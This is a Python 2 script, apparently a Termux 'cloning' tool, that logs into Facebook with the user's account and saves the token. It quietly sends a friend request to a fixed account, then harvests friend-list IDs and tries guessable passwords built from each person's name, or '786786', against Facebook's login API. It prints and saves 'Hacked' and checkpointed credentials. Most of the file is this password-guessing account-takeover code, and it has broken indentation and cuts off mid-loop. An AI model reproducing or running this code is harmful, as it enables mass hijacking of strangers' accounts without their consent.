#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Shabir Baloch
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.0001)

#Dev:B4BALOCH
##### LOGO #####
logo = """
\033[1;95m░██████╗██╗░░██╗░█████╗░██████╗░██╗██████╗░
\033[1;95m██╔════╝██║░░██║██╔══██╗██╔══██╗██║██╔══██╗
\033[1;95m╚█████╗░███████║███████║██████╦╝██║██████╔╝
\033[1;95m░╚═══██╗██╔══██║██╔══██║██╔══██╗██║██╔══██╗
\033[1;95m██████╔╝██║░░██║██║░░██║██████╦╝██║██║░░██║
\033[1;95m╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚═╝
\033[1;95m╭━━╮╭━━━┳╮╱╱╭━━━┳━━━┳╮╱╭╮
\033[1;95m┃╭╮┃┃╭━╮┃┃╱╱┃╭━╮┃╭━╮┃┃╱┃┃
\033[1;95m┃╰╯╰┫┃╱┃┃┃╱╱┃┃╱┃┃┃╱╰┫╰━╯┃
\033[1;95m┃╭━╮┃╰━╯┃┃╱╭┫┃╱┃┃┃╱╭┫╭━╮┃
\033[1;95m┃╰━╯┃╭━╮┃╰━╯┃╰━╯┃╰━╯┃┃╱┃┃
\033[1;95m╰━━━┻╯╱╰┻━━━┻━━━┻━━━┻╯╱╰╯

\033[1;93m_____&&&&&&&&__________________________
________________&&&&&&&&&&&&&&&&_______________________
___&&&&___________&&&&&&&&&&&&_____________&&&&______
___&&&&_______&&&&&&&&&&&&&&&&_______&&&&_________
____&&&&&_____&&&&&&&&&&&&&&&_____&&&&__________
_______&&&&____&&&&&&&&&&&&&____&&&&________
_______&&___&&&&&&&&&&&&&&&&&___&&&&__________
_________&&&&_________________&&&&________
_________&&&&_________________&&&&_________
_________&&&&_________________&&&&_____________
_________&&&&_________________&&&&_____
_________&&&&_________________&&&&_________
_________&&&&_________________&&&&___________
_________&&&&_________________&&&&______________
_________&&&&_________________&&&&_____________________
_________&&&&_________________&&&&___________________
_________&&&&_________________&&&&____________________
_________&&&&_________________&&&&____________
_________&&&&_________________&&&&____________
_________&&&&_________________&&&&_________
_________&&&&_________________&&&&___________
_________&&&&_________________&&&&_______________
_________&&&&_________________&&&&___________________
_________&&&&_________________&&&&__________________
_________&&&&_________________&&&&_________________________
\033[1;95m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mBaloch\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•
\033[1;91m:•◈•🆁🅰🅹 🅺🅷🅾🅽🅳🅾🅺🅰🆁
\033[1;91m:•◈•🅁🄰🄹 🄺🄷🄾🄽🄳🄾🄺🄰🅁
\033[1;91m:•◈•H̴̺̫͉̾͠A̴͔͓͋͒͒C̸̟̻̦̐͝͠K̵̡̼̘̈́̚͠E̴͎̠̒̔̐R̸̙̪̘͊̕͝ 🆁🅰🅹
\033[1;91m:•◈•нⷩAͣCͨᴋⷦ ᴛⷮнⷩEͤ нⷩAͣCͨKER
\033[1;91m:•◈•Ꭱ𝓐ﻞ 𝗛𝗔𝗖𝗞𝗘𝗥
\033[1;91m:•◈•C̶R̶A̶C̶K̶E̶R̶
\033[1;95m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mBaloch\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;95mPlease Wait \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;95m
\033[1;95m╭━━╮╭╮╱╭╮╭━━╮╭━━━┳╮╱╱╭━━━┳━━━┳╮╱╭╮
\033[1;95m┃╭╮┃┃┃╱┃┃┃╭╮┃┃╭━╮┃┃╱╱┃╭━╮┃╭━╮┃┃╱┃┃
\033[1;95m┃╰╯╰┫╰━╯┃┃╰╯╰┫┃╱┃┃┃╱╱┃┃╱┃┃┃╱╰┫╰━╯┃
\033[1;95m┃╭━╮┣━━╮┃┃╭━╮┃╰━╯┃┃╱╭┫┃╱┃┃┃╱╭┫╭━╮┃
\033[1;95m┃╰━╯┃╱╱┃┃┃╰━╯┃╭━╮┃╰━╯┃╰━╯┃╰━╯┃┃╱┃┃
\033[1;95m╰━━━╯╱╱╰╯╰━━━┻╯╱╰┻━━━┻━━━┻━━━┻╯╱╰╯
\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;95mBaloch\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""
jalan("\033[1;91m_______________________¶¶¶________________________")
jalan("\033[1;91m____________________¶¶¶¶¶¶¶¶¶¶¶___________________")
jalan("\033[1;91m__________________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_________________")
jalan("\033[1;91m________________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________________")
jalan("\033[1;91m_______________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_______________")
jalan("\033[1;91m______________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶______________")
jalan("\033[1;91m_____________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____________")
jalan("\033[1;91m_____________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____________")
jalan("\033[1;91m____________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶____________")
jalan("\033[1;91m___________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶____________")
jalan("\033[1;91m___________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___________")
jalan("\033[1;91m__________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___________")
jalan("\033[1;91m__________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___________")
jalan("\033[1;91m__________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___________")
jalan("\033[1;91m_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__________")
jalan("\033[1;91m_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__________")
jalan("\033[1;91m_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__________")
jalan("\033[1;91m_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__________")
jalan("\033[1;91m_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__________")
jalan("\033[1;91m_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_________")
jalan("\033[1;91m_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_________")
jalan("\033[1;91m_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_________")
jalan("\033[1;91m_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_________")
jalan("\033[1;91m_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___¶¶¶¶¶¶¶¶_________")
jalan("\033[1;91m_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____¶¶¶¶¶¶¶_________")
jalan("\033[1;91m__________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____¶¶¶¶¶¶¶_________")
jalan("\033[1;91m__________¶¶¶¶___¶¶¶¶¶¶¶¶¶¶¶¶_____¶¶¶¶¶¶¶_________")
jalan("\033[1;91m__________¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶_____¶¶¶¶¶¶__________")
jalan("\033[1;91m___________¶¶_____¶¶¶¶¶¶¶¶¶¶¶_____¶¶¶¶¶¶__________")
jalan("\033[1;91m___________¶¶_____¶¶¶¶_¶¶¶¶¶¶¶___¶¶¶¶¶¶___________")
jalan("\033[1;91m___________¶¶¶____¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶____________")
jalan("\033[1;91m____________¶¶¶___¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶_____________")
jalan("\033[1;91m____________¶¶¶¶_¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶______¶_______")
jalan("\033[1;91m________¶____¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶_______¶¶¶¶____")
jalan("\033[1;91m_____¶¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_________¶¶¶¶____")
jalan("\033[1;91m____¶¶¶¶¶_______¶¶¶¶¶¶¶¶¶¶¶¶¶¶____________¶¶¶¶____")
jalan("\033[1;91m____¶¶¶¶¶________¶¶¶¶¶¶¶¶__¶_¶____________¶¶¶¶____")
jalan("\033[1;91m_____¶¶¶¶________¶¶¶¶¶¶¶¶__¶_¶____________¶¶¶¶____")
jalan("\033[1;91m_____¶¶¶¶________¶¶¶¶¶¶_¶____¶¶__________¶¶¶¶_____")
jalan("\033[1;91m_____¶¶¶¶________¶¶¶¶_¶____¶_¶¶__________¶¶¶¶_____")
jalan("\033[1;91m_____¶¶¶¶________¶¶_¶____¶_¶¶¶¶¶_________¶¶¶¶_____")
jalan("\033[1;91m______¶¶¶_____________¶¶¶¶¶¶¶¶¶¶_________¶¶¶¶_____")
jalan("\033[1;91m______¶¶¶¶_______¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶_______¶¶¶¶¶¶¶¶¶_")
jalan("\033[1;91m___¶¶¶¶¶¶¶¶¶_____¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶______¶¶¶¶¶¶¶¶¶¶¶")
jalan("\033[1;91m_¶¶¶¶¶¶¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶¶¶¶")
jalan("\033[1;91m_¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶__¶¶¶¶¶_")
jalan("\033[1;91m__¶¶¶¶¶__¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶______¶¶¶¶¶¶____¶¶¶¶_")
jalan("\033[1;91m___¶¶¶_____¶¶¶¶¶¶_________________¶¶¶¶¶_______¶¶¶_")
jalan("\033[1;91m___¶¶_______¶¶¶¶¶¶¶_____________¶¶¶¶¶¶____________")
jalan("\033[1;91m______________¶¶¶¶¶¶¶__________¶¶¶¶¶¶_____________")
jalan("\033[1;91m_______________¶¶¶¶¶¶¶________¶¶¶¶¶_______________")
jalan("\033[1;91m_________________¶¶¶¶¶¶¶____¶¶¶¶¶¶________________")
jalan("\033[1;91m__________________¶¶¶¶¶¶¶__¶¶¶¶¶¶_________________")
jalan("\033[1;91m____________________¶¶¶¶¶¶¶¶¶¶¶___________________")
jalan("\033[1;91m______________________¶¶¶¶¶¶¶¶________¶¶__________")
jalan("\033[1;91m_______________________¶¶¶¶¶¶¶_______¶¶¶¶_________")
jalan("\033[1;91m_____________¶¶______¶¶¶¶¶¶¶¶¶¶¶____¶¶¶¶¶_________")
jalan("\033[1;91m_____________¶¶¶¶___¶¶¶¶¶__¶¶¶¶¶¶__¶¶¶¶¶__________")
jalan("\033[1;91m____________¶¶¶¶¶__¶¶¶¶¶_____¶¶¶¶¶¶¶¶¶¶___________")
jalan("\033[1;91m_____________¶¶¶¶¶¶¶¶¶_________¶¶¶¶¶¶_____________")
jalan("\033[1;91m________________¶¶¶¶¶____________¶¶¶______________")
jalan("\033[1;91m________________¶¶¶______________¶¶¶_____________")
jalan("\033[1;91m_________________¶¶_______________¶¶¶_____________")
jalan("\033[1;91m________________¶¶¶_______________¶¶¶¶____________")
jalan("\033[1;91m________________¶¶¶_______________¶¶¶¶____________")
jalan("\033[1;91m_______________¶¶¶¶_______________¶¶¶¶____________")
jalan("\033[1;91m_______________¶¶¶¶_______________________________")
jalan("\033[1;91m------------------------------------------------")                                     
jalan("\033[1;93m --Tool Update 100%   Welcome to B4 RaJ---")
print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBaloch\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

CorrectUsername = "Raj"
CorrectPassword = "Rajvai"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m📋 \x1b[1;95mTool Username \x1b[1;91m»» \x1b[1;91m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;91m🗝 \x1b[1;95mTool Password \x1b[1;91m»» \x1b[1;91m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:B4BALOCH
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;91mWrong Password"
            os.system('xdg-open https://www.facebook.com/raj.hasan.3152130')
    else:
        print "\033[1;91mWrong Username"
        os.system('xdg-open https://www.facebook.com/raj.hasan.3152130') 

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		jalan(' \033[1;91mWarning: \033[1;95mDo Not Use Your Personal Account' )
		jalan(' \033[1;91mWarning: \033[1;95mUse a New Account To Login' )
		jalan(' \033[1;91mWarning: \033[1;95mTermux  New Updated Tool' )                 
		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mBaloch\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
		print('	   \033[1;91m▬\x1b[1;95m.........LOGIN WITH FACEBOOK........\x1b[1;91m▬' )
		print('	' )
		id = raw_input('\033[1;91m[+] \x1b[1;91mID/Email\x1b[1;95m: \x1b[1;95m')
		pwd = raw_input('\033[1;91m[+] \x1b[1;91mPassword\x1b[1;95m: \x1b[1;95m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;91mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful.•◈•..'
				os.system('xdg-open https://www.youtube.com/channel/UCAGKWM8EwDFZ9sP8CdJhGBA')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;91mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;91mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:B4BALOCH
	print logo
	print "  \033[1;95m«----•◈••◈•----\033[1;91mLogged in User Info\033[1;95m----•◈••◈•-----»"
	print "	   \033[1;91m Name\033[1;91m:\033[1;91m"+nama+"\033[1;95m               "
	print "	   \033[1;91m ID\033[1;91m:\033[1;91m"+id+"\x1b[1;95m              "
	print "\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;95mBaloch\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
	print "\033[1;91m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;95mStart Cloning..."
	print "\033[1;91m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mlogout            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;95mClone From Friend List."
	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;95mClone Friend List Public Account."
	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBaloch\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
		jalan('\033[1;91mGetting IDs \033[1;91m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBaloch\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91mName\033[1;95m:\033[1;95m "+op["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
			super()
		print"\033[1;91mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;95mTotal IDs\033[1;91m: \033[1;95m"+str(len(id))
	jalan('\033[1;91mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;95mCloning\033[1;91m"+o),;sys.stdout.flush();time.sleep(0.00001)
	print "\n\033[1;91m«--•◈••◈•---\x1b[1;95m•◈•Stop Process Press CTRL+Z•◈•\033[1;91m---•◈••◈•-»"
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBaloch\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
	jalan(' \033[1;91m.................\033[1;95mCloning Start..\033[1;91m............ ')
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBaloch\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
	
			
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:B4BALOCH
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '1234'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;91m[  ✓  ] \x1b[1;92mHacked⛔'											
				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']
				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '123'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;91m[  ✓  ] \x1b[1;92mHacked⛔'											
				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								
				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'123'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHacked⛔'								
						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									
						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							
						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['first_name'] + 'khan'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHacked⛔'											
				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = '786786'							
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHacked⛔'						
